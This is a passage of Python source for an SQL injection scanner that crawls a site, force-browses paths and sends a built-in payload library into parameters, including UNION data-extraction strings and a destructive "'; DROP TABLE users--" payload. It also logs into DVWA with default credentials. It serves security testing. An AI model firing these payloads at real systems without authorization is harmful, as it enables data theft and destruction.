#!/usr/bin/env python3
"""
Enhanced SQL Injection Vulnerability Scanner (Comprehensive)
===========================================
Combines the best features of both scripts:
- From GitHub script: Crawling, DVWA login, form deduplication, raw HTTP logging
- From professional script: Rate limiting, concurrent scanning, confidence scoring, database-specific detection
- NEW: Header injection (User-Agent, Referer)
- NEW: URL Path/Rewrite injection
- NEW: JavaScript link extraction
- RESTORED: Full Payload Library & Deep Crawling Logic
- FIX: CSV Dataset generation with Labels (0=Safe, 1=Vuln) and correct Method logging

⚠️ EDUCATIONAL USE ONLY
This tool is for authorized security testing only.
Only scan systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal.
"""

import argparse
import csv
import json
import logging
import os
import re
import sys
import time
import threading
import random
import string
import csv
import json
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, NamedTuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, urljoin

try:
    import requests
    from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
    from colorama import Fore, Style, init
    import warnings
    warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
    init()  # Initialize Colorama
except ImportError:
    print("Error: Required packages not installed.")
    print("Run: pip install requests beautifulsoup4 colorama")
    sys.exit(1)


# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

# Common paths for forced browsing (Dictionary Attack)
COMMON_PATHS = [
    "Register.asp",
    "Login.asp"
]

# ============================================================================
# ENUMS AND DATA CLASSES
# ============================================================================

class PayloadType(Enum):
    """Categories of SQL injection payloads."""
    BOOLEAN = "boolean"
    ERROR = "error"
    TIME = "time"
    COMMENT = "comment"
    UNION = "union"


class VulnerabilityLevel(Enum):
    """Classification of vulnerability likelihood."""
    LIKELY_VULNERABLE = "LIKELY_VULNERABLE"
    POSSIBLY_VULNERABLE = "POSSIBLY_VULNERABLE"
    NOT_VULNERABLE = "NOT_VULNERABLE"


class Payload(NamedTuple):
    """Represents a single SQL injection payload."""
    value: str
    payload_type: PayloadType
    description: str
    risk_level: str  # low, medium, high


@dataclass
class Parameter:
    """Represents an injectable parameter."""
    name: str
    value: str
    method: str  # GET, POST, HEADER, PATH
    source: str  # url, form, header, path
    form_context: Dict[str, Any] = field(default_factory=dict)
    inferred_type: str = "string"


@dataclass
class FormSignature:
    """Represents a form signature for deduplication."""
    action: str
    method: str
    input_names: List[str]
    
    @classmethod
    def from_form_details(cls, form_details: Dict[str, Any]) -> 'FormSignature':
        """Create signature from form details."""
        action = form_details.get("action", "")
        method = form_details.get("method", "get")
        input_names = sorted([inp.get("name", "") for inp in form_details.get("inputs", []) if inp.get("name")])
        return cls(action=action, method=method, input_names=input_names)
    
    def to_string(self) -> str:
        """Convert to string representation."""
        return f"{self.action}|{self.method}|{'|'.join(self.input_names)}"


@dataclass
class DetectionResult:
    """Result of vulnerability detection analysis."""
    level: VulnerabilityLevel
    evidence: List[str]
    response_length: int
    response_time: float
    error_messages: List[str]
    confidence_score: float  # 0.0 to 1.0


@dataclass
class Finding:
    """Represents a vulnerability finding."""
    url: str
    parameter: str
    payload: str
    payload_type: str
    risk_level: str
    evidence: List[str]
    response_length: int
    response_time: float
    confidence: float
    original_base_url: str = "" # Used for deduplication
    is_vulnerable: bool = False
    raw_request: str = ""
    raw_response: str = ""
    method: str = "GET" # Store method for CSV
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    level: VulnerabilityLevel = VulnerabilityLevel.NOT_VULNERABLE
    
    # ML Extension fields
    ml_confidence: float = 0.0
    ml_prediction: int = 0
    payload_features: Dict[str, Any] = field(default_factory=dict)
    response_features: Dict[str, Any] = field(default_factory=dict)
    
    # New: Multi-type tracking
    payload_types: Set[str] = field(default_factory=set)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        d = asdict(self)
        # Handle Enum serialization
        if hasattr(self, 'level') and isinstance(self.level, Enum):
            d['level'] = self.level.value
        # Handle Set serialization for JSON
        if hasattr(self, 'payload_types'):
            d['payload_types'] = list(self.payload_types)
        return d
    
    def to_csv_row(self) -> Dict[str, Any]:
        """Convert to CSV row dictionary."""
        return {
            "timestamp": self.timestamp,
            "url": self.url,
            "method": self.method,
            "parameter": self.parameter,
            "payload": self.payload,
            "payload_type": self.payload_type,
            "risk_level": self.risk_level,
            "evidence": "; ".join(self.evidence),
            "response_length": self.response_length,
            "response_time": self.response_time,
            "confidence": self.confidence,
            "label": 1 if self.is_vulnerable else 0,
            "full_request": self.raw_request,
            "full_response": self.raw_response,
        }
    
    def get_vulnerable_url_key(self) -> str:
        """Get a unique key for this vulnerable URL (without payload)."""
        # If we have the original base URL (before injection), use that
        if self.original_base_url:
            parsed = urlparse(self.original_base_url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            return f"{base}|{self.parameter}"
            
        # Fallback
        parsed = urlparse(self.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return f"{base_url}|{self.parameter}"


@dataclass
class ScanSummary:
    """Summary of scan results."""
    target_url: str
    scan_start: str
    scan_end: str
    duration_minutes: float
    duration_seconds: float
    urls_discovered: int
    urls_scanned: int
    vulnerable_urls: int  # Unique vulnerable URLs
    total_parameters: int
    total_payloads_tested: int
    total_requests: int
    total_findings: int  # Total vulnerabilities found (all payloads)
    unique_findings: int  # Unique vulnerabilities (deduplicated by URL)
    likely_vulnerable: int
    possibly_vulnerable: int
    findings: List[Finding]
    vulnerable_urls_list: List[str]  # List of unique vulnerable URLs
    verdict: str
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        data = asdict(self)
        data['findings'] = [f.to_dict() for f in self.findings]
        return data


# ============================================================================
# PAYLOAD LIBRARY (FULL)
# ============================================================================

# Boolean-based payloads
BOOLEAN_PAYLOADS: List[Payload] = [
    Payload("'", PayloadType.ERROR, "Single quote test", "low"),
    Payload("\"", PayloadType.ERROR, "Double quote test", "low"),
    Payload("' OR '1'='1", PayloadType.BOOLEAN, "Classic boolean OR injection", "medium"),
    Payload("\" OR \"1\"=\"1", PayloadType.BOOLEAN, "Boolean OR with double quotes", "medium"),
    Payload("' OR 1=1--", PayloadType.BOOLEAN, "Boolean OR with comment", "medium"),
    Payload("' OR 1=1#", PayloadType.BOOLEAN, "Boolean OR with hash comment", "medium"),
    Payload("' AND 1=1 -- ", PayloadType.BOOLEAN, "Boolean AND true test", "medium"),
    Payload("' AND 1=0 -- ", PayloadType.BOOLEAN, "Boolean AND false test", "medium"),
    Payload("' AND 'a'='a", PayloadType.BOOLEAN, "String comparison true", "medium"),
    Payload("' AND 'a'='b", PayloadType.BOOLEAN, "String comparison false", "medium"),
    Payload("1 AND 1=1", PayloadType.BOOLEAN, "Numeric true test", "medium"),
    Payload("1 AND 1=0", PayloadType.BOOLEAN, "Numeric false test", "medium"),
    Payload("admin'--", PayloadType.BOOLEAN, "Admin bypass attempt", "high"),
    Payload("' OR TRUE--", PayloadType.BOOLEAN, "True Literal", "medium"),
    Payload("' OR FALSE--", PayloadType.BOOLEAN, "False Literal", "medium"),
    Payload("') OR ('1'='1", PayloadType.BOOLEAN, "Paren Bypass", "medium"),
]

# Error-based payloads
ERROR_PAYLOADS: List[Payload] = [
    Payload("'", PayloadType.ERROR, "Single quote break", "low"),
    Payload("\"", PayloadType.ERROR, "Double quote break", "low"),
    Payload("`", PayloadType.ERROR, "Backtick break", "low"),
    Payload("')", PayloadType.ERROR, "Quote with parenthesis", "low"),
    Payload("';", PayloadType.ERROR, "Quote with semicolon", "low"),
    Payload("\\", PayloadType.ERROR, "Backslash test", "low"),
    Payload("''", PayloadType.ERROR, "Double single quotes", "low"),
    Payload("\"\"", PayloadType.ERROR, "Double double quotes", "low"),
    Payload("1'1", PayloadType.ERROR, "Embedded quote in number", "low"),
    Payload("[]", PayloadType.ERROR, "Brackets", "low"),
]

# Time-based payloads
TIME_PAYLOADS: List[Payload] = [
    Payload("' OR SLEEP(5)--", PayloadType.TIME, "MySQL SLEEP delay", "high"),
    Payload("\" OR SLEEP(5)--", PayloadType.TIME, "MySQL SLEEP with quotes", "high"),
    Payload("' OR SLEEP(3)--", PayloadType.TIME, "MySQL short SLEEP", "high"),
    Payload("'; WAITFOR DELAY '00:00:05'--", PayloadType.TIME, "MSSQL WAITFOR DELAY", "high"),
    Payload("' OR pg_sleep(5)--", PayloadType.TIME, "PostgreSQL pg_sleep", "high"),
    Payload("1 OR SLEEP(5)#", PayloadType.TIME, "Numeric SLEEP", "high"),
    Payload("' OR BENCHMARK(10000000,MD5('test'))--", PayloadType.TIME, "MySQL BENCHMARK", "high"),
    Payload("; SELECT SLEEP(5)", PayloadType.TIME, "Stacked SLEEP", "high"),
    Payload("1; SELECT SLEEP(5)", PayloadType.TIME, "Stacked SLEEP Numeric", "high"),
]

# Comment-based payloads
COMMENT_PAYLOADS: List[Payload] = [
    Payload("'--", PayloadType.COMMENT, "Line comment", "medium"),
    Payload("\"--", PayloadType.COMMENT, "Double quote comment", "medium"),
    Payload("'#", PayloadType.COMMENT, "Hash comment", "medium"),
    Payload("'/*", PayloadType.COMMENT, "Block comment start", "medium"),
    Payload("*/", PayloadType.COMMENT, "Block comment end", "low"),
    Payload("'-- -", PayloadType.COMMENT, "Spaced comment", "medium"),
    Payload("';--", PayloadType.COMMENT, "Semicolon comment", "medium"),
]

# Union-based payloads
UNION_PAYLOADS: List[Payload] = [
    Payload("' UNION SELECT NULL--", PayloadType.UNION, "Single column UNION", "high"),
    Payload("' UNION SELECT NULL,NULL--", PayloadType.UNION, "Two column UNION", "high"),
    Payload("' UNION SELECT NULL,NULL,NULL--", PayloadType.UNION, "Three column UNION", "high"),
    Payload("' UNION SELECT NULL,NULL,NULL,NULL--", PayloadType.UNION, "Four column UNION", "high"),
    Payload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", PayloadType.UNION, "Five column UNION", "high"),
    Payload("' UNION SELECT 1,2,3--", PayloadType.UNION, "Numeric UNION", "high"),
    Payload("' UNION ALL SELECT NULL--", PayloadType.UNION, "UNION ALL variant", "high"),
    Payload("\" UNION SELECT NULL--", PayloadType.UNION, "Double quote UNION", "high"),
    Payload("' UNION SELECT user(), database()--", PayloadType.UNION, "Data extraction UNION", "high"),
]

# Dangerous payloads (from GitHub script)
DANGEROUS_PAYLOADS: List[Payload] = [
    Payload("'; DROP TABLE users--", PayloadType.BOOLEAN, "DROP TABLE test", "high"),
    Payload("' OR '1'='1' -- ", PayloadType.BOOLEAN, "Spaced comment variant", "medium"),
    Payload("' OR '1'='1' #", PayloadType.BOOLEAN, "Hash variant", "medium"),
]


def get_all_payloads() -> List[Payload]:
    """Return all payloads from all categories."""
    return (
        BOOLEAN_PAYLOADS +
        ERROR_PAYLOADS +
        TIME_PAYLOADS +
        COMMENT_PAYLOADS +
        UNION_PAYLOADS +
        DANGEROUS_PAYLOADS
    )


def get_quick_payloads() -> List[Payload]:
    """Return a smaller set of payloads for quick scanning."""
    return [
        # Essential payloads only
        BOOLEAN_PAYLOADS[0],   # '
        BOOLEAN_PAYLOADS[1],   # "
        BOOLEAN_PAYLOADS[2],   # ' OR '1'='1
        BOOLEAN_PAYLOADS[4],   # ' OR 1=1--
        ERROR_PAYLOADS[0],     # ' (error)
        TIME_PAYLOADS[0],      # ' OR SLEEP(5)--
        COMMENT_PAYLOADS[0],   # '--
    ]


def get_safe_payloads() -> List[Payload]:
    """Return payloads that are less likely to cause issues."""
    return [p for p in get_all_payloads() if p.payload_type != PayloadType.TIME]


# ============================================================================
# DETECTOR (Enhanced with both error signatures)
# ============================================================================

# SQL Error patterns by database type (from professional script)
SQL_ERROR_PATTERNS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc\.exceptions",
        r"Unclosed quotation mark after the character string",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "Microsoft SQL Server": [
        r"Driver.*SQL[\-\_\ ]*Server",
        r"OLE DB.*SQL Server",
        r"Microsoft OLE DB Provider", # Common in older IIS/ASP
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"ODBC SQL Server Driver",
        r"Unclosed quotation mark after the character string",
    ],
    "Oracle": [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d+:",
        r"sqlite3\.OperationalError:",
    ],
}

# GitHub error signatures
GITHUB_ERROR_SIGNATURES = {
    "quoted string not properly terminated",
    "unclosed quotation mark after the character string",
    "you have an error in your sql syntax",
    "unknown column in 'field list'",
    "unexpected end of sql command",
    "warning: mysql_num_rows() expects parameter 1 to be resource",
    "warning: mysql_fetch_array() expects parameter 1 to be resource",
    "sql syntax error",
    "unrecognized token",
    "syntax error at or near",
    "division by zero",
    "missing right parenthesis",
    "incorrect integer value",
    "invalid sql statement",
    "subquery returns more than 1 row",
    "data truncation: data too long for column",
    "conversion failed when converting",
    "ora-00933: sql command not properly ended",
    "ora-00942: table or view does not exist",
    "sqlite3::sqlexception: unrecognized token",
    "postgresql error: fatal error",
    "mysql server version for the right syntax"
}

# Combine all error patterns
ALL_ERROR_PATTERNS = list(GITHUB_ERROR_SIGNATURES)
for db_patterns in SQL_ERROR_PATTERNS.values():
    ALL_ERROR_PATTERNS.extend(db_patterns)

# Compiled regex patterns
COMPILED_PATTERNS: Dict[str, List[re.Pattern]] = {
    db: [re.compile(pattern, re.IGNORECASE) for pattern in patterns]
    for db, patterns in SQL_ERROR_PATTERNS.items()
}

# Also compile generic patterns
GENERIC_PATTERNS = [re.compile(pattern, re.IGNORECASE) for pattern in ALL_ERROR_PATTERNS]


class SQLiDetector:
    """Enhanced detector combining both approaches."""
    
    def __init__(
        self,
        baseline_response: Optional[str] = None,
        baseline_length: Optional[int] = None,
        time_threshold: float = 3.0,  # GitHub uses 3 seconds
        length_threshold: float = 0.25,
        growth_threshold: int = 50,  # GitHub threshold
    ):
        


        
        # Load baseline responses to avoid re-fetching
        self.baseline_cache = {}
        self.baseline_response = baseline_response
        self.baseline_length = baseline_length or (len(baseline_response) if baseline_response else 0)
        self.time_threshold = time_threshold
        self.length_threshold = length_threshold
        self.growth_threshold = growth_threshold
    
    def detect_sql_errors(self, response_text: str) -> Tuple[List[str], List[str]]:
        """Detect SQL errors using both pattern sets."""
        databases_detected: List[str] = []
        errors_found: List[str] = []
        
        # Check database-specific patterns
        for db_type, patterns in COMPILED_PATTERNS.items():
            for pattern in patterns:
                matches = pattern.findall(response_text)
                if matches:
                    if db_type not in databases_detected:
                        databases_detected.append(db_type)
                    for match in matches[:3]:
                        error_str = match if isinstance(match, str) else str(match)
                        if error_str not in errors_found:
                            errors_found.append(error_str[:100])
        
        # Check generic patterns (GitHub style)
        lower_text = response_text.lower()
        for error_msg in GITHUB_ERROR_SIGNATURES:
            if error_msg.lower() in lower_text:
                if "Generic" not in databases_detected:
                    databases_detected.append("Generic")
                if error_msg not in errors_found:
                    errors_found.append(error_msg[:100])
        
        return databases_detected, errors_found
    
    def detect_response_difference(self, response_text: str) -> Tuple[bool, float]:
        """Compare response with baseline."""
        if not self.baseline_length:
            return False, 0.0
        
        current_length = len(response_text)
        difference = abs(current_length - self.baseline_length)
        
        # Percentage difference (professional script)
        ratio = difference / self.baseline_length if self.baseline_length > 0 else 0.0
        
        # Absolute difference (GitHub script)
        absolute_difference = current_length - self.baseline_length
        
        # Combined detection
        ratio_detected = ratio > self.length_threshold
        absolute_detected = abs(absolute_difference) > self.growth_threshold
        
        return (ratio_detected or absolute_detected), ratio
    
    def detect_time_based(self, response_time: float, payload: str) -> bool:
        """Check for time-based injection."""
        if response_time >= self.time_threshold:
            # Check if payload contains time-based functions
            time_keywords = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
            return any(keyword in payload.lower() for keyword in time_keywords)
        return False
    
    def detect_content_changes(self, baseline_text: str, response_text: str, payload: str) -> List[str]:
        """Detect content-based vulnerabilities."""
        evidence = []
        base_lower = baseline_text.lower()
        resp_lower = response_text.lower()
        
        # Data extraction detection (GitHub feature)
        if "admin" in resp_lower and "admin" not in base_lower:
            evidence.append("Data extraction: 'admin' user exposed")
        
        # Boolean blind detection
        if "' and 1=0" in payload.lower() or "'a'='b'" in payload.lower():
            if len(response_text) < len(baseline_text) - 50:
                evidence.append("Boolean blind: False condition reduces content")
        
        # Error pages
        if any(e in resp_lower for e in ["404", "not found", "error"]):
            if "error" not in evidence:
                evidence.append("Error page detected")
        
        return evidence
    
    def analyze(
        self,
        response_text: str,
        response_time: float,
        payload: str = "",
        baseline_text: str = ""
    ) -> DetectionResult:
        """Perform comprehensive vulnerability analysis."""
        evidence: List[str] = []
        confidence = 0.0
        
        # 1. Check for SQL errors
        databases, errors = self.detect_sql_errors(response_text)
        if errors:
            evidence.append(f"SQL errors detected from: {', '.join(databases)}")
            confidence += 0.6
        
        # 2. Check response length difference
        is_different, diff_ratio = self.detect_response_difference(response_text)
        if is_different:
            evidence.append(f"Response length differs by {diff_ratio:.1%} from baseline")
            confidence += 0.3
        
        # 3. Check for time-based injection
        if self.detect_time_based(response_time, payload):
            evidence.append(f"Time delay detected: {response_time:.2f}s")
            confidence += 0.7
        
        # 4. Check content changes
        if baseline_text:
            content_evidence = self.detect_content_changes(baseline_text, response_text, payload)
            evidence.extend(content_evidence)
            if content_evidence:
                confidence += 0.2

        # 5. Multiple Evidence Bonus (Organic Boost)
        # If we have multiple strong indicators, confidence should be very high
        indicators = 0
        if errors: indicators += 1
        if is_different: indicators += 1
        if self.detect_time_based(response_time, payload): indicators += 1
        
        if indicators >= 2:
            confidence += 0.2 # Boost for corroboration
            evidence.append("Multiple evidence types corroborate vulnerability")
        
        # Determine vulnerability level
        if confidence >= 0.8: # Changed threshold to match "High" definition
            level = VulnerabilityLevel.LIKELY_VULNERABLE
        elif confidence >= 0.3:
            level = VulnerabilityLevel.POSSIBLY_VULNERABLE
        else:
            level = VulnerabilityLevel.NOT_VULNERABLE
        
        return DetectionResult(
            level=level,
            evidence=evidence,
            response_length=len(response_text),
            response_time=response_time,
            error_messages=errors,
            confidence_score=min(confidence, 1.0)
        )


# ============================================================================
# RATE LIMITER (Professional feature)
# ============================================================================

class TokenBucketRateLimiter:
    """Thread-safe token bucket rate limiter."""
    
    def __init__(self, rate: float = 3.0, capacity: int = 5):
        self.rate = rate
        self.capacity = capacity
        self.tokens = capacity
        self.last_update = time.monotonic()
        self._lock = threading.Lock()
    
    def _add_tokens(self) -> None:
        """Add tokens based on elapsed time."""
        now = time.monotonic()
        elapsed = now - self.last_update
        new_tokens = elapsed * self.rate
        self.tokens = min(self.capacity, self.tokens + new_tokens)
        self.last_update = now
    
    def acquire(self, timeout: Optional[float] = None) -> bool:
        """Acquire a token, blocking if necessary."""
        deadline = None if timeout is None else time.monotonic() + timeout
        
        while True:
            with self._lock:
                self._add_tokens()
                
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    return True
                
                wait_time = (1.0 - self.tokens) / self.rate
            
            if deadline is not None:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return False
                wait_time = min(wait_time, remaining)
            
            time.sleep(wait_time)
    
    @property
    def available_tokens(self) -> float:
        """Get current number of available tokens."""
        with self._lock:
            self._add_tokens()
            return self.tokens


# ============================================================================
# HTTP HELPERS (GitHub features)
# ============================================================================

def get_raw_request(response: requests.Response) -> str:
    """Reconstruct raw HTTP request (GitHub feature)."""
    try:
        req = response.request
        method = req.method
        url = req.path_url
        headers = ' /// '.join(f'{k}: {v}' for k, v in req.headers.items())
        body = req.body if req.body else ""
        return f"{method} {url} HTTP/1.1 /// {headers} /// /// {body}"
    except:
        return "Could not reconstruct request"


def get_raw_response(response: requests.Response) -> str:
    """Reconstruct raw HTTP response (GitHub feature)."""
    try:
        status_line = f"HTTP/1.1 {response.status_code} {response.reason}"
        headers = ' /// '.join(f'{k}: {v}' for k, v in response.headers.items())
        text = response.text.replace('\r', '').replace('\n', ' ')
        return f"{status_line} /// {headers} /// /// {text[:1000]}"
    except:
        return "Could not reconstruct response"


# ============================================================================
# DVWA LOGIN (GitHub feature)
# ============================================================================

def dvwa_login(session: requests.Session, target_url: str, security_level: str = "low") -> bool:
    """Login to DVWA and set security level."""
    DVWA_USER = "admin"
    DVWA_PASS = "password"
    
    if "vulnerabilities" in target_url:
        base_url = target_url.split("vulnerabilities")[0]
    else:
        base_url = target_url
    
    print(f"{Fore.CYAN}[*] Attempting DVWA login (Base: {base_url})...{Style.RESET_ALL}")
    
    try:
        # Login
        login_url = urljoin(base_url, "login.php")
        resp = session.get(login_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        csrf_token = None
        csrf_input = soup.find('input', {'name': 'user_token'})
        if csrf_input:
            csrf_token = csrf_input.get('value')
        
        login_data = {'username': DVWA_USER, 'password': DVWA_PASS, 'Login': 'Login'}
        if csrf_token:
            login_data['user_token'] = csrf_token
        
        session.post(login_url, data=login_data)
        
        # Set security level
        security_url = urljoin(base_url, "security.php")
        resp = session.get(security_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        csrf_input = soup.find('input', {'name': 'user_token'})
        if csrf_input:
            csrf_token = csrf_input.get('value')
            security_data = {'security': security_level, 'seclev_submit': 'Submit', 'user_token': csrf_token}
            session.post(security_url, data=security_data)
            
            # Verify
            verify_resp = session.get(security_url)
            if f"Security Level is <em>{security_level}</em>" in verify_resp.text:
                print(f"{Fore.GREEN}[+] DVWA login successful (Security: {security_level.upper()}){Style.RESET_ALL}")
                return True
        
        return False
    except Exception as e:
        print(f"{Fore.RED}[-] DVWA login error: {e}{Style.RESET_ALL}")
        return False

# FORM HANDLING (GitHub features)
# ============================================================================

def get_all_forms(url: str, session: requests.Session) -> List[Any]:
    """Get all forms from a page."""
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except:
        return []


def get_form_details(form: Any) -> Dict[str, Any]:
    """Extract form details."""
    details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    # Input fields
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    
    # Text areas
    for textarea in form.find_all("textarea"):
        name = textarea.attrs.get("name")
        value = textarea.get_text()
        inputs.append({"type": "textarea", "name": name, "value": value})
    
    # Select fields
    for select in form.find_all("select"):
        name = select.attrs.get("name")
        options = select.find_all("option")
        value = options[0].attrs.get("value", "") if options else ""
        inputs.append({"type": "select", "name": name, "value": value})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def prioritize_payloads(payloads: List[Payload], param_type: str) -> List[Payload]:
    """Prioritize payloads based on parameter type."""
    if param_type == "int":
        # Prioritize numeric payloads (those NOT starting with quotes)
        return sorted(payloads, key=lambda p: 0 if not (p.value.startswith("'") or p.value.startswith('"')) else 1)
    else:
        # Prioritize string payloads (those starting with quotes)
        return sorted(payloads, key=lambda p: 0 if (p.value.startswith("'") or p.value.startswith('"')) else 1)


# ============================================================================
# MAIN SCANNER CLASS WITH DEDUPLICATION
# ============================================================================

def crawl_site(url: str, session: requests.Session, max_depth: int = 2, max_urls: int = 300) -> List[str]:
    """
    Crawl the website to discover links using multi-threaded batch processing.
    Includes "Dynamic Heuristic Discovery" (Suffix detection + XML/JSON mining).
    """
    print("crawling.......")
    
    discovered_urls = {url}
    queue = deque([(url, 0)])
    visited = {url}
    
    # Dynamic Heuristics State
    dynamic_suffixes = set()
    # Seed suffix from target if possible
    path = urlparse(url).path
    if '.' in path:
        ext = os.path.splitext(path)[1]
        if ext in ['.php', '.asp', '.aspx', '.jsp']:
            dynamic_suffixes.add(ext)

    # Soft 404 Detection
    # print(f"{Fore.CYAN}[*] Phase 1: Initial discovery & Soft 404 check{Style.RESET_ALL}")
    soft_404_detected = False
    try:
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        soft_404_url = urljoin(url, random_path)
        resp = session.get(soft_404_url, timeout=10)
        if resp.status_code == 200:
            # print(f"{Fore.YELLOW}[!] Soft 404 detected. Heuristics might produce false positives.{Style.RESET_ALL}")
            soft_404_detected = True
    except:
        pass

    # Targeted Forced Browsing (Phase 1.5)
    # Targeted Forced Browsing (Phase 1.5)
    print(f"{Fore.CYAN}[*] Phase 1.5: Targeted Forced Browsing (COMMON_PATHS)...{Style.RESET_ALL}")
    
    max_workers = 10
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        path_futures = {}
        for path in COMMON_PATHS:
            full_url = urljoin(url, path)
            path_futures[executor.submit(session.get, full_url, timeout=10)] = full_url

        for future in as_completed(path_futures):
            try:
                forced_url = path_futures[future]
                resp = future.result()
                if resp.status_code == 200 and forced_url not in discovered_urls:
                    # Verify it's not a soft 404 if detection was successful
                    if soft_404_detected and len(resp.text) < 500: # Simple heuristic check if unsure
                         continue
                         
                    print(f"{Fore.GREEN}[+] Forced Browse Found: {forced_url}{Style.RESET_ALL}")
                    discovered_urls.add(forced_url)
                    queue.append((forced_url, 0)) # Add to queue with depth 0 start
                    visited.add(forced_url)
            except:
                pass

    # Recursive Crawling
    # print(f"{Fore.CYAN}[*] Phase 2: Recursive & Heuristic Crawling (Depth: {max_depth}){Style.RESET_ALL}")
    
    max_workers = 10
    
    while queue:
        if len(discovered_urls) >= max_urls:
            # print(f"{Fore.YELLOW}[!] Max URLs limit reached ({max_urls}).{Style.RESET_ALL}")
            break

        # Process a batch
        batch = []
        while queue and len(batch) < 50:
            batch.append(queue.popleft())
            
        if not batch:
            break
            
        # print(f"[*] Batch processing {len(batch)} URLs...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {
                executor.submit(session.get, curr_url, timeout=10): (curr_url, depth) 
                for curr_url, depth in batch
            }
            
            for future in as_completed(future_to_url):
                if len(discovered_urls) >= max_urls:
                    break
                    
                curr_url, depth = future_to_url[future]
                
                # Check depth for standard crawling, but allow heuristics on current page
                if depth > max_depth:
                    continue
                    
                try:
                    response = future.result()
                    if response.status_code != 200:
                        continue
                        
                    soup = BeautifulSoup(response.text, 'html.parser')
                    text_content = response.text
                    
                    # --- DYNAMIC HEURISTICS ---
                    
                    # 1. Suffix Learning
                    # Look for patterns like: + '.php' or + ".php" in JS
                    # Matches: variable + '.php' or 'string' + '.php'
                    suffixes = re.findall(r"\+ ?['\"](\.[a-z]{2,4})['\"]", text_content)
                    if suffixes:
                        for s in suffixes:
                            if s not in dynamic_suffixes:
                                # print(f"{Fore.MAGENTA}[*] Learned dynamic suffix: {s}{Style.RESET_ALL}")
                                dynamic_suffixes.add(s)
                    
                    # 2. URL Extraction
                    new_links = set()
                    
                    # Standard HTML
                    for tag in soup.find_all(['a', 'link', 'script', 'iframe', 'form']):
                        href = tag.get('href') or tag.get('src') or tag.get('action')
                        if href:
                            new_links.add(href)

                    # JS Regex
                    js_paths = re.findall(r"['\"]([a-zA-Z0-9_./-]+\.(?:php|html|js|json|xml))['\"]", text_content)
                    new_links.update(js_paths)
                    
                    # AJAX-like paths
                    ajax_paths = re.findall(r"['\"](/[a-zA-Z0-9_./-]+)['\"]", text_content)
                    new_links.update(ajax_paths)

                    # 3. Data Mining & Fuzzing (XML/JSON)
                    is_data = False
                    stripped_start = text_content[:100].strip().lower()
                    if stripped_start.startswith('<') and 'html' not in stripped_start: # Likely XML
                         is_data = True
                    elif stripped_start.startswith('{') or stripped_start.startswith('['): # Likely JSON
                         is_data = True
                         
                    if is_data and dynamic_suffixes and not soft_404_detected and depth < max_depth:
                        pass # Suffix heuristics disabled for clean output request (or failed previously)
                    
                    # Process Found Links
                    for link in new_links:
                        if len(discovered_urls) >= max_urls:
                            break
                        
                        full_url = urljoin(curr_url, link)
                        parsed = urlparse(full_url)
                        
                        if parsed.netloc == urlparse(url).netloc:
                            full_url = full_url.split('#')[0]
                            
                            if full_url not in visited:
                                visited.add(full_url)
                                discovered_urls.add(full_url)
                                queue.append((full_url, depth + 1))
                                
                except Exception as e:
                    # print(e) # Debug
                    pass
                    
    # print(f"{Fore.GREEN}[+] Total URLs discovered: {len(discovered_urls)}{Style.RESET_ALL}")
    return list(discovered_urls)


class EnhancedSQLiScanner:
    """Enhanced scanner combining best features from both scripts with deduplication."""
    
    def __init__(
        self,
        target_url: str,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        threads: int = 3,
        rate_limit: float = 3.0,
        timeout: float = 10.0,
        max_depth: int = 2,
        crawl: bool = False,
        do_dvwa_login: bool = False, # CHANGED from dvwa_login to avoid conflict
        dvwa_level: str = "low",
        output_file: Optional[str] = None,
        csv_output: Optional[str] = None,
